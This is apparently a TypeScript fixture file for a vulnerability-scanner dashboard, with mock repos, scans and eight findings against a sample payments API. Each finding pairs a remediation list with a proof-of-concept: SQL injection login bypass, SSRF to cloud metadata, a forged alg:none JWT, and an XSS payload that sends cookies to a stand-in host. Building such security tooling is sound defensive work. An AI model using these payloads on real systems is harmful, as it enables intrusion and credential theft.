/* -------------------------------------------------------------------------- */
/*  lib/mock-data.ts                                                           */
/*  Hardcoded fixtures for the Aegis MVP dashboard. Every shape mirrors what   */
/*  the backend will eventually return, so wiring the real API later is a      */
/*  drop-in swap. Findings speak the product's own language: a CVSS score, a   */
/*  CWE id, and a validated proof-of-concept on every vulnerability.           */
/* -------------------------------------------------------------------------- */

export type Severity = "critical" | "high" | "medium" | "low";
export type ScanStatus = "pending" | "running" | "completed" | "failed";
export type RepoStatus = "protected" | "at_risk" | "scanning" | "never_scanned";

export interface SeverityCounts {
  critical: number;
  high: number;
  medium: number;
  low: number;
}

export interface Repo {
  id: string;
  name: string; // org/repo
  url: string;
  visibility: "public" | "private";
  language: string;
  langColor: string;
  defaultBranch: string;
  lastScanLabel: string | null;
  status: RepoStatus;
  openFindings: number;
}

export interface Scan {
  id: string;
  repo: string; // org/repo
  branch: string;
  commit: string; // short sha
  dateLabel: string;
  timeLabel: string;
  durationSec: number | null; // null while pending / running
  status: ScanStatus;
  findings: SeverityCounts;
  riskScore: number; // 0–100
}

export interface Vulnerability {
  id: string;
  title: string;
  severity: Severity;
  cwe: string;
  cvss: number;
  location: string; // file:line
  validated: boolean;
  description: string;
  pocLang: string;
  poc: string;
  remediation: string[];
}

export interface ScanReport {
  meta: {
    id: string;
    repo: string;
    branch: string;
    commit: string;
    startedLabel: string;
    durationSec: number | null;
    status: ScanStatus;
    riskScore: number;
    model: string;
    findings: SeverityCounts;
  };
  vulnerabilities: Vulnerability[];
}

/* ----------------------------- helpers ---------------------------------- */

export function totalFindings(c: SeverityCounts): number {
  return c.critical + c.high + c.medium + c.low;
}

export function formatDuration(sec: number | null): string {
  if (sec == null) return "—";
  if (sec < 60) return `${sec}s`;
  const m = Math.floor(sec / 60);
  const s = sec % 60;
  return s === 0 ? `${m}m` : `${m}m ${s}s`;
}

export function severityFromCvss(cvss: number): Severity {
  if (cvss >= 9) return "critical";
  if (cvss >= 7) return "high";
  if (cvss >= 4) return "medium";
  return "low";
}

/* --------------------------- overview stats ----------------------------- */

export const dashboardStats = {
  totalScans: { value: 342, deltaPct: 12, sub: "vs. previous week" },
  activeVulns: {
    value: 37,
    breakdown: { critical: 3, high: 8, medium: 17, low: 9 } as SeverityCounts,
  },
  riskScore: { value: 68, delta: -6, sub: "improving" },
};

export const weeklyScans: { day: string; scans: number; validated: number }[] = [
  { day: "Fri", scans: 9, validated: 4 },
  { day: "Sat", scans: 4, validated: 1 },
  { day: "Sun", scans: 3, validated: 2 },
  { day: "Mon", scans: 14, validated: 6 },
  { day: "Tue", scans: 11, validated: 5 },
  { day: "Wed", scans: 16, validated: 7 },
  { day: "Thu", scans: 12, validated: 3 },
];

export type ActivityKind =
  | "validated"
  | "scan_completed"
  | "scan_started"
  | "remediation"
  | "scan_failed"
  | "repo_connected";

export const recentActivity: {
  id: string;
  kind: ActivityKind;
  repo: string;
  detail: string;
  time: string;
  severity?: Severity;
}[] = [
  {
    id: "a1",
    kind: "validated",
    repo: "acme/payments-api",
    detail: "SQL injection on POST /auth/login — replayed 3×, confirmed",
    time: "6m ago",
    severity: "critical",
  },
  {
    id: "a2",
    kind: "remediation",
    repo: "acme/payments-api",
    detail: "Patch PR opened for IDOR on GET /invoices/:id",
    time: "22m ago",
  },
  {
    id: "a3",
    kind: "scan_started",
    repo: "acme/web-dashboard",
    detail: "Deep scan queued on push to main",
    time: "38m ago",
  },
  {
    id: "a4",
    kind: "validated",
    repo: "acme/mobile-gateway",
    detail: "SSRF via webhook fetch reached instance metadata",
    time: "1h ago",
    severity: "high",
  },
  {
    id: "a5",
    kind: "scan_completed",
    repo: "acme/notifications-svc",
    detail: "Scan finished clean — 0 validated findings",
    time: "2h ago",
  },
  {
    id: "a6",
    kind: "scan_failed",
    repo: "acme/billing-worker",
    detail: "Sandbox timed out cloning private submodule",
    time: "3h ago",
  },
];

/* ------------------------------ repos ----------------------------------- */

export const repos: Repo[] = [
  {
    id: "r1",
    name: "acme/payments-api",
    url: "https://github.com/acme/payments-api",
    visibility: "private",
    language: "Python",
    langColor: "#3572A5",
    defaultBranch: "main",
    lastScanLabel: "Jul 3, 2026 · 14:02",
    status: "at_risk",
    openFindings: 8,
  },
  {
    id: "r2",
    name: "acme/web-dashboard",
    url: "https://github.com/acme/web-dashboard",
    visibility: "private",
    language: "TypeScript",
    langColor: "#3178C6",
    defaultBranch: "main",
    lastScanLabel: "Jul 3, 2026 · 13:41",
    status: "scanning",
    openFindings: 2,
  },
  {
    id: "r3",
    name: "acme/mobile-gateway",
    url: "https://github.com/acme/mobile-gateway",
    visibility: "private",
    language: "Go",
    langColor: "#00ADD8",
    defaultBranch: "release",
    lastScanLabel: "Jul 2, 2026 · 19:20",
    status: "at_risk",
    openFindings: 4,
  },
  {
    id: "r4",
    name: "acme/notifications-svc",
    url: "https://github.com/acme/notifications-svc",
    visibility: "private",
    language: "TypeScript",
    langColor: "#3178C6",
    defaultBranch: "main",
    lastScanLabel: "Jul 3, 2026 · 11:58",
    status: "protected",
    openFindings: 0,
  },
  {
    id: "r5",
    name: "acme/billing-worker",
    url: "https://github.com/acme/billing-worker",
    visibility: "private",
    language: "Python",
    langColor: "#3572A5",
    defaultBranch: "main",
    lastScanLabel: "Jul 1, 2026 · 08:10",
    status: "at_risk",
    openFindings: 3,
  },
  {
    id: "r6",
    name: "acme/marketing-site",
    url: "https://github.com/acme/marketing-site",
    visibility: "public",
    language: "TypeScript",
    langColor: "#3178C6",
    defaultBranch: "main",
    lastScanLabel: null,
    status: "never_scanned",
    openFindings: 0,
  },
];

/* ------------------------------ scans ----------------------------------- */

export const scans: Scan[] = [
  {
    id: "scn_8f2a41",
    repo: "acme/payments-api",
    branch: "main",
    commit: "a1c9f4e",
    dateLabel: "Jul 3, 2026",
    timeLabel: "14:02",
    durationSec: 512,
    status: "completed",
    findings: { critical: 2, high: 2, medium: 2, low: 2 },
    riskScore: 82,
  },
  {
    id: "scn_7b1e02",
    repo: "acme/web-dashboard",
    branch: "main",
    commit: "3d7be10",
    dateLabel: "Jul 3, 2026",
    timeLabel: "13:41",
    durationSec: null,
    status: "running",
    findings: { critical: 0, high: 1, medium: 1, low: 0 },
    riskScore: 34,
  },
  {
    id: "scn_66aa9c",
    repo: "acme/mobile-gateway",
    branch: "release",
    commit: "9f0c22a",
    dateLabel: "Jul 2, 2026",
    timeLabel: "19:20",
    durationSec: 733,
    status: "completed",
    findings: { critical: 0, high: 2, medium: 1, low: 1 },
    riskScore: 61,
  },
  {
    id: "scn_5c4d18",
    repo: "acme/notifications-svc",
    branch: "main",
    commit: "b22e7d5",
    dateLabel: "Jul 3, 2026",
    timeLabel: "11:58",
    durationSec: 388,
    status: "completed",
    findings: { critical: 0, high: 0, medium: 0, low: 0 },
    riskScore: 12,
  },
  {
    id: "scn_44f7e3",
    repo: "acme/billing-worker",
    branch: "main",
    commit: "77c1a0b",
    dateLabel: "Jul 3, 2026",
    timeLabel: "09:15",
    durationSec: null,
    status: "failed",
    findings: { critical: 0, high: 0, medium: 0, low: 0 },
    riskScore: 0,
  },
  {
    id: "scn_39b0d7",
    repo: "acme/payments-api",
    branch: "feat/refunds",
    commit: "e5901ac",
    dateLabel: "Jul 2, 2026",
    timeLabel: "16:44",
    durationSec: 601,
    status: "completed",
    findings: { critical: 1, high: 3, medium: 2, low: 4 },
    riskScore: 74,
  },
  {
    id: "scn_2a8c60",
    repo: "acme/marketing-site",
    branch: "main",
    commit: "0ab34fe",
    dateLabel: "Jul 3, 2026",
    timeLabel: "15:30",
    durationSec: null,
    status: "pending",
    findings: { critical: 0, high: 0, medium: 0, low: 0 },
    riskScore: 0,
  },
  {
    id: "scn_1d6f9b",
    repo: "acme/mobile-gateway",
    branch: "release",
    commit: "cc71d90",
    dateLabel: "Jul 1, 2026",
    timeLabel: "10:05",
    durationSec: 690,
    status: "completed",
    findings: { critical: 0, high: 1, medium: 3, low: 2 },
    riskScore: 58,
  },
];

/* -------------------------- detailed report ----------------------------- */

const PAYMENTS_VULNS: Vulnerability[] = [
  {
    id: "AEG-4471-01",
    title: "SQL injection allows authentication bypass on /auth/login",
    severity: "critical",
    cwe: "CWE-89",
    cvss: 9.8,
    location: "services/auth/login.py:88",
    validated: true,
    description:
      "The login handler concatenates the submitted email directly into a raw SQL query. A crafted payload short-circuits the WHERE clause, returning the first admin row and issuing a valid session — no password required. Aegis executed the payload in an isolated clone and authenticated as user id 1.",
    pocLang: "bash",
    poc: `# Authenticate as the first user (admin) with no valid credentials
curl -s https://sandbox.aegis/acme-payments/auth/login \\
  -H 'Content-Type: application/json' \\
  -d '{"email":"x@x.com'"'"' OR 1=1 --","password":"anything"}'

# → 200 OK  Set-Cookie: session=eyJ1aWQiOjEs...  (uid=1, role=admin)`,
    remediation: [
      "Replace string interpolation with parameterized queries or the ORM's bound parameters.",
      "Reject inputs failing strict email validation before they reach the data layer.",
      "Rotate any sessions issued during the exposure window and audit admin-role access logs.",
    ],
  },
  {
    id: "AEG-4471-02",
    title: "Hardcoded cloud credentials committed to source",
    severity: "critical",
    cwe: "CWE-798",
    cvss: 9.1,
    location: "config/settings.py:14",
    validated: true,
    description:
      "A long-lived AWS access key pair is checked into the repository. The key is active and grants read access to the production S3 bucket holding exported invoices. Aegis confirmed the credential resolves to a live IAM principal.",
    pocLang: "python",
    poc: `# Present in config/settings.py, line 14
AWS_ACCESS_KEY_ID = "AKIA5X7QEXAMPLE9QK2"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# Sandbox verification
$ aws s3 ls s3://acme-invoices-prod --profile leaked
# → 2026-07-01 03:14  invoices-2026-06.csv   (live principal: svc-payments)`,
    remediation: [
      "Revoke the exposed IAM key pair immediately and issue short-lived credentials via your secrets manager.",
      "Purge the secret from git history (git filter-repo / BFG) — rotating alone is not enough once committed.",
      "Add a pre-commit secret scanner to block future credential commits.",
    ],
  },
  {
    id: "AEG-4471-03",
    title: "IDOR exposes other tenants' invoices on GET /invoices/:id",
    severity: "high",
    cwe: "CWE-639",
    cvss: 8.1,
    location: "api/v1/invoices.py:57",
    validated: true,
    description:
      "The invoice endpoint loads records by id without checking tenant ownership. Iterating the numeric id returns invoices belonging to other organizations. Aegis replayed the request across three sequential ids, each returning foreign-tenant data.",
    pocLang: "bash",
    poc: `# Authenticated as tenant 88, request a neighbouring invoice id
curl -s https://sandbox.aegis/acme-payments/api/v1/invoices/1042 \\
  -H 'Authorization: Bearer <tenant-88-token>'

# → 200 OK  {"id":1042,"tenant_id":57,"amount":"$4,210.00", ...}
#   foreign tenant data returned — replayed 3×, confirmed`,
    remediation: [
      "Scope every invoice lookup to the authenticated tenant (WHERE tenant_id = :current).",
      "Return 404 rather than 403 for cross-tenant ids to avoid confirming their existence.",
      "Add an authorization test asserting tenant isolation for each object-by-id route.",
    ],
  },
  {
    id: "AEG-4471-04",
    title: "SSRF in webhook fetch reaches instance metadata",
    severity: "high",
    cwe: "CWE-918",
    cvss: 7.5,
    location: "services/webhooks.py:42",
    validated: true,
    description:
      "The webhook registration accepts an arbitrary URL and fetches it server-side with no allow-list. Pointing it at the cloud metadata endpoint returns IAM role credentials. Aegis retrieved a temporary credential set in the sandbox.",
    pocLang: "bash",
    poc: `# Register a webhook pointed at the metadata service
curl -s https://sandbox.aegis/acme-payments/api/v1/webhooks \\
  -H 'Authorization: Bearer <token>' \\
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# The follow-up delivery response leaks:
# → "svc-payments"  {"AccessKeyId":"ASIA...","Token":"IQoJb3Jp..."}`,
    remediation: [
      "Validate outbound URLs against an explicit allow-list of hosts and schemes.",
      "Block requests to link-local, loopback, and private CIDR ranges after DNS resolution.",
      "Require IMDSv2 and drop the metadata role's unused permissions.",
    ],
  },
  {
    id: "AEG-4471-05",
    title: "Reflected XSS in the invoice search results page",
    severity: "medium",
    cwe: "CWE-79",
    cvss: 6.1,
    location: "web/templates/search.html:20",
    validated: true,
    description:
      "The search term is echoed into the results page without escaping. A crafted query executes attacker-controlled script in the victim's session context when the link is opened.",
    pocLang: "html",
    poc: `<!-- Victim opens a link containing: -->
/invoices/search?q=<script>fetch('//x.aegis/c?'+document.cookie)</script>

<!-- Rendered verbatim into the DOM: -->
<h2>Results for <script>fetch('//x.aegis/c?'+document.cookie)</script></h2>`,
    remediation: [
      "Context-encode all user input on output; prefer the framework's auto-escaping template tags.",
      "Set a Content-Security-Policy that disallows inline script execution.",
      "Mark the session cookie HttpOnly so it is unreachable from script.",
    ],
  },
  {
    id: "AEG-4471-06",
    title: "JWT accepts alg:none, enabling token forgery",
    severity: "medium",
    cwe: "CWE-347",
    cvss: 5.9,
    location: "core/security.py:31",
    validated: true,
    description:
      "The token verifier trusts the algorithm declared in the JWT header. Submitting a token with \"alg\":\"none\" and no signature is accepted, letting an attacker forge arbitrary claims including role escalation.",
    pocLang: "bash",
    poc: `# Forge an admin token with no signature
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64url)
CLAIMS=$(echo -n '{"uid":1,"role":"admin"}'   | base64url)
TOKEN="$HEADER.$CLAIMS."

curl -s https://sandbox.aegis/acme-payments/api/v1/admin/users \\
  -H "Authorization: Bearer $TOKEN"   # → 200 OK`,
    remediation: [
      "Pin verification to a single expected algorithm (e.g. RS256) and reject all others.",
      "Never accept \"none\"; fail closed when the header algorithm is unexpected.",
      "Verify the signature against a rotated key before reading any claim.",
    ],
  },
  {
    id: "AEG-4471-07",
    title: "Stack traces disclosed in 500 responses",
    severity: "low",
    cwe: "CWE-209",
    cvss: 3.7,
    location: "app/middleware/errors.py:9",
    validated: true,
    description:
      "Unhandled exceptions return the full Python traceback, including file paths, library versions, and query fragments — useful reconnaissance for an attacker mapping the stack.",
    pocLang: "bash",
    poc: `curl -s 'https://sandbox.aegis/acme-payments/api/v1/invoices/not-an-int'

# → 500  Traceback (most recent call last):
#   File "/app/api/v1/invoices.py", line 57, in get_invoice
#   psycopg2.errors.InvalidTextRepresentation: invalid input syntax ...`,
    remediation: [
      "Return a generic error body in production; log the trace server-side only.",
      "Set DEBUG=false and verify the framework's production error handler is active.",
    ],
  },
  {
    id: "AEG-4471-08",
    title: "Missing security response headers",
    severity: "low",
    cwe: "CWE-693",
    cvss: 2.4,
    location: "app/main.py:120",
    validated: true,
    description:
      "Responses omit HSTS, X-Content-Type-Options, and a Content-Security-Policy, weakening the browser's defenses against transport downgrade, MIME sniffing, and injection.",
    pocLang: "bash",
    poc: `curl -sI https://sandbox.aegis/acme-payments/ | grep -iE 'strict-transport|content-security|x-content-type'
# → (no matching headers returned)`,
    remediation: [
      "Add Strict-Transport-Security, X-Content-Type-Options: nosniff, and a Content-Security-Policy at the edge or app layer.",
      "Adopt a shared secure-headers middleware so every route is covered by default.",
    ],
  },
];

function countBySeverity(vulns: Vulnerability[]): SeverityCounts {
  return vulns.reduce(
    (acc, v) => {
      acc[v.severity] += 1;
      return acc;
    },
    { critical: 0, high: 0, medium: 0, low: 0 } as SeverityCounts,
  );
}

/**
 * Returns a detailed report for any scan id. The header meta is drawn from the
 * matching scan (falling back to the featured completed scan), while the
 * vulnerability set is the fully-worked payments-api example so every report
 * page renders rich content for the MVP.
 */
export function getScanReport(id: string): ScanReport {
  const scan = scans.find((s) => s.id === id) ?? scans[0];
  const vulnerabilities = PAYMENTS_VULNS;
  return {
    meta: {
      id: scan.id,
      repo: scan.repo,
      branch: scan.branch,
      commit: scan.commit,
      startedLabel: `${scan.dateLabel} · ${scan.timeLabel}`,
      durationSec: scan.durationSec,
      status: scan.status,
      riskScore: scan.riskScore || 82,
      model: "aegis-agent · multi-agent v2",
      findings: countBySeverity(vulnerabilities),
    },
    vulnerabilities,
  };
}
